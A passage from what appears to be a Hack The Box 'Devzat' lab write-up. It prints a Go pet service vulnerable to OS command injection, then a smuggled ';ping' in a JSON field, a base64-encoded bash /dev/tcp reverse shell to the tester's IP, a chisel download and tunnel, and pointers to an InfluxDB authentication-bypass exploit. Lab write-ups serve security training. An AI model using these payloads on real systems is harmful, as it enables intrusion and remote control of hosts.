/root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/dog</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/giraffe</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/gopher</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/petshop</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/redkite</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/go.mod</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/go.sum</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/main.go</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/petshop</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/start.sh</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h1 id="vuln-confirm"><a href="#vuln-confirm" class="headerlink" title="vuln confirm"></a>vuln confirm</h1><p>We got the source code, let’s dig in.</p>
+<ul>
+<li>main.go</li>
+</ul>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;embed&quot;</span></span><br><span class="line">        <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;io/fs&quot;</span></span><br><span class="line">        <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">        <span class="string">&quot;log&quot;</span></span><br><span class="line">        <span class="string">&quot;net/http&quot;</span></span><br><span class="line">        <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">        <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static/public</span></span><br><span class="line"><span class="keyword">var</span> web embed.FS</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static/public/index.html</span></span><br><span class="line"><span class="keyword">var</span> index []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Pet <span class="keyword">struct</span> &#123;</span><br><span class="line">        Name            <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">        Species         <span class="type">string</span> <span class="string">`json:&quot;species&quot;`</span></span><br><span class="line">        Characteristics <span class="type">string</span> <span class="string">`json:&quot;characteristics&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">        Pets []Pet = []Pet&#123;</span><br><span class="line">                &#123;Name: <span class="string">&quot;Cookie&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">                &#123;Name: <span class="string">&quot;Mia&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">                &#123;Name: <span class="string">&quot;Chuck&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">                &#123;Name: <span class="string">&quot;Balu&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">                &#123;Name: <span class="string">&quot;Georg&quot;</span>, Species: <span class="string">&quot;gopher&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;gopher&quot;</span>)&#125;,</span><br><span class="line">                &#123;Name: <span class="string">&quot;Gustav&quot;</span>, Species: <span class="string">&quot;giraffe&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;giraffe&quot;</span>)&#125;,</span><br><span class="line">                &#123;Name: <span class="string">&quot;Rudi&quot;</span>, Species: <span class="string">&quot;redkite&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;redkite&quot;</span>)&#125;,</span><br><span class="line">                &#123;Name: <span class="string">&quot;Bruno&quot;</span>, Species: <span class="string">&quot;bluewhale&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;bluewhale&quot;</span>)&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadCharacter</span><span class="params">(species <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">        cmd := exec.Command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat characteristics/&quot;</span>+species)</span><br><span class="line">        stdoutStderr, err := cmd.CombinedOutput()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> err.Error()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="type">string</span>(stdoutStderr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getPets</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        json.NewEncoder(w).Encode(Pets)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addPet</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line">        <span class="keyword">var</span> addPet Pet</span><br><span class="line">        err := json.Unmarshal(reqBody, &amp;addPet)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                e := fmt.Sprintf(<span class="string">&quot;There has been an error: %+v&quot;</span>, err)</span><br><span class="line">                http.Error(w, e, http.StatusBadRequest)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        addPet.Characteristics = loadCharacter(addPet.Species)</span><br><span class="line">        Pets = <span class="built_in">append</span>(Pets, addPet)</span><br><span class="line"></span><br><span class="line">        w.WriteHeader(http.StatusOK)</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;Pet was added successfully&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleRequest</span><span class="params">()</span></span> &#123;</span><br><span class="line">        build, err := fs.Sub(web, <span class="string">&quot;static/public/build&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        css, err := fs.Sub(web, <span class="string">&quot;static/public/css&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        spaHandler := http.HandlerFunc(spaHandlerFunc)</span><br><span class="line">        <span class="comment">// Single page application handler</span></span><br><span class="line">        http.Handle(<span class="string">&quot;/&quot;</span>, headerMiddleware(spaHandler))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// All static folder handler</span></span><br><span class="line">        http.Handle(<span class="string">&quot;/build/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/build&quot;</span>, http.FileServer(http.FS(build)))))</span><br><span class="line">        http.Handle(<span class="string">&quot;/css/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/css&quot;</span>, http.FileServer(http.FS(css)))))</span><br><span class="line">        http.Handle(<span class="string">&quot;/.git/&quot;</span>, headerMiddleware(http.StripPrefix(<span class="string">&quot;/.git&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;.git&quot;</span>)))))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// API routes</span></span><br><span class="line">        apiHandler := http.HandlerFunc(petHandler)</span><br><span class="line">        http.Handle(<span class="string">&quot;/api/pet&quot;</span>, headerMiddleware(apiHandler))</span><br><span class="line">        log.Fatal(http.ListenAndServe(<span class="string">&quot;127.0.0.1:5000&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spaHandlerFunc</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        w.WriteHeader(http.StatusOK)</span><br><span class="line">        w.Write(index)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">petHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        <span class="comment">// Dispatch by method</span></span><br><span class="line">        <span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">                addPet(w, r)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> r.Method == http.MethodGet &#123;</span><br><span class="line">                getPets(w, r)</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Add Update and Delete</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">headerMiddleware</span><span class="params">(next http.Handler)</span></span> http.Handler &#123;</span><br><span class="line">        <span class="keyword">return</span> http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">                w.Header().Add(<span class="string">&quot;Server&quot;</span>, <span class="string">&quot;My genious go pet server&quot;</span>)</span><br><span class="line">                next.ServeHTTP(w, r)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        resetTicker := time.NewTicker(<span class="number">5</span> * time.Second)</span><br><span class="line">        done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">                <span class="keyword">for</span> &#123;</span><br><span class="line">                        <span class="keyword">select</span> &#123;</span><br><span class="line">                        <span class="keyword">case</span> &lt;-done:</span><br><span class="line">                                <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">case</span> &lt;-resetTicker.C:</span><br><span class="line">                                <span class="comment">// Reset Pets to prestaged ones</span></span><br><span class="line">                                Pets = []Pet&#123;</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Cookie&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Mia&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Chuck&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Balu&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Georg&quot;</span>, Species: <span class="string">&quot;gopher&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;gopher&quot;</span>)&#125;,</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Gustav&quot;</span>, Species: <span class="string">&quot;giraffe&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;giraffe&quot;</span>)&#125;,</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Rudi&quot;</span>, Species: <span class="string">&quot;redkite&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;redkite&quot;</span>)&#125;,</span><br><span class="line">                                        &#123;Name: <span class="string">&quot;Bruno&quot;</span>, Species: <span class="string">&quot;bluewhale&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;bluewhale&quot;</span>)&#125;,</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;()</span><br><span class="line"></span><br><span class="line">        handleRequest()</span><br><span class="line"></span><br><span class="line">        time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">        resetTicker.Stop()</span><br><span class="line">        done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Species is vulnerable to OS command injection. Add a pet name and intercept the request.</p>
+<p>Let’s first try to get a ping request back to our machine. Make sure to setup a tcpdump. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/pet HTTP/1.1</span><br><span class="line">Host: pets.devzat.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://pets.devzat.htb/</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Origin: http://pets.devzat.htb</span><br><span class="line">Content-Length: 53</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;luci&quot;</span>,<span class="string">&quot;species&quot;</span>:<span class="string">&quot;cat;ping -c 4 10.10.14.12&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Forward the request and check tcpdump.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># tcpdump -i tun0 icmp</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span><br><span class="line">09:46:30.479050 IP devzat.htb &gt; 10.10.14.12: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">09:46:30.479081 IP 10.10.14.12 &gt; devzat.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">09:46:31.381887 IP devzat.htb &gt; 10.10.14.12: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">09:46:31.381909 IP 10.10.14.12 &gt; devzat.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">09:46:32.286606 IP devzat.htb &gt; 10.10.14.12: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">09:46:32.286624 IP 10.10.14.12 &gt; devzat.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">09:46:33.196134 IP devzat.htb &gt; 10.10.14.12: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">09:46:33.196149 IP 10.10.14.12 &gt; devzat.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 4, length 64</span><br></pre></td></tr></table></figure>
+
+<p>We got 4 hits from the machine. Let’s gain a reverse shell via this vulnerability. Let’s encode our bash one-liner and send the request.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># echo -n &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1&#x27; | base64</span></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi85MDAxIDA+JjE=</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>payload:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>;<span class="built_in">echo</span> -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi85MDAxIDA+JjE= | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure>
+
+<p>Check the listener.</p>
+<p>Stabilize the shell and run linpeas.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001                                                                                                                  </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.11.118.</span><br><span class="line">Ncat: Connection from 10.10.11.118:50764.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (846): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">patrick@devzat:~/pets$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(patrick) gid=1000(patrick) <span class="built_in">groups</span>=1000(patrick)</span><br><span class="line">patrick@devzat:~/pets$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">patrick</span><br><span class="line">patrick@devzat:~/pets$ python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line">$ reset</span><br><span class="line">$ screen</span><br><span class="line">patrick@devzat:~$ find / -name <span class="string">&quot;user.txt&quot;</span> 2&gt;/dev/null</span><br><span class="line">/home/catherine/user.txt</span><br><span class="line">patrick@devzat:~$ <span class="built_in">cat</span> /home/catherine/user.txt</span><br><span class="line"><span class="built_in">cat</span>: /home/catherine/user.txt: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>You will find a process and port and application name.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root 1229 0.0 0.1 550720 3856 ? Sl Oct16 0:00 _ /usr/bin/docker-proxy-proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086</span><br></pre></td></tr></table></figure>
+
+<p>Let’s forward that port to our kali machine.</p>
+<ul>
+<li>in kali machine</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># ./chisel server -p 8000 --reverse</span></span><br><span class="line">2021/10/19 09:57:19 server: Reverse tunnelling enabled</span><br><span class="line">2021/10/19 09:57:19 server: Fingerprint 3b:f7:31:4d:44:c5:fa:8a:b8:e7:c3:37:bb:0d:40:5f</span><br><span class="line">2021/10/19 09:57:19 server: Listening on http://0.0.0.0:8000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>in target machine</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">patrick@devzat:/tmp$ wget 10.10.14.12/chisel</span><br><span class="line">--2021-10-19 14:01:09--  http://10.10.14.12/chisel</span><br><span class="line">Connecting to 10.10.14.12:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 8687616 (8.3M) [application/octet-stream]</span><br><span class="line">Saving to: ‘chisel’</span><br><span class="line"></span><br><span class="line">chisel              100%[===================&gt;]   8.29M   481KB/s    <span class="keyword">in</span> 20s     </span><br><span class="line"></span><br><span class="line">2021-10-19 14:01:30 (415 KB/s) - ‘chisel’ saved [8687616/8687616]</span><br><span class="line"></span><br><span class="line">patrick@devzat:/tmp$ <span class="built_in">chmod</span> 777 chisel</span><br><span class="line">patrick@devzat:/tmp$ ./chisel client 10.10.14.12:8000 R:8086:127.0.0.1:8086 &amp;</span><br><span class="line">[1] 76754</span><br><span class="line">patrick@devzat:/tmp$ 2021/10/19 14:01:46 client: Connecting to ws://10.10.14.12:8000</span><br><span class="line">2021/10/19 14:01:47 client: Fingerprint 3b:f7:31:4d:44:c5:fa:8a:b8:e7:c3:37:bb:0d:40:5f</span><br><span class="line">2021/10/19 14:01:48 client: Connected (Latency 199.990409ms)</span><br></pre></td></tr></table></figure>
+
+<h1 id="get-user"><a href="#get-user" class="headerlink" title="get user"></a>get user</h1><p>Let’s do a service enumeration on this port.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># nmap -p 8086 -sV 127.0.0.1</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 10:02 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000058s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8086/tcp open  http    InfluxDB http admin 1.7.5</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 16.94 seconds</span><br></pre></td></tr></table></figure>
+
+<p>InfluxDB 1.7.5 is running on docker, let’s look for any vulnerability.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmluZmx1eGRhdGEuY29tL2luZmx1eGRiL3YxLjcvYWJvdXRfdGhlX3Byb2plY3QvcmVsZWFzZW5vdGVzLWNoYW5nZWxvZy8jMTc2LTIwMTktMDQtMTYv">InfluxDB 1.7 release notes InfluxDB OSS 1.7 Documentation<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>TL;DR</p>
+<p>The vulnerability allows a remote attacker to bypass authentication process. The vulnerability exists due the JWT token may have an empty SharedSecret in the authenticate function in services&#x2F;httpd&#x2F;handler.go. A remote non-authenticated attacker can bypass authentication process and gain unauthorized access to the application.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua29tb2Rvc2VjLmNvbS9wb3N0L3doZW4tYWxsLWVsc2UtZmFpbHMtZmluZC1hLTAtZGF5">When all else fails - find a 0-day<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>We can exploit it manually by understanding the above blog and steps. Or we can automate with below poc.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xvcmVuem9UdWxsaW5pL0luZmx1eERCLUV4cGxvaXQtQ1ZFLTIwMTktMjA5MzM=">InfluxDB Exploit CVE-2019-20933<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
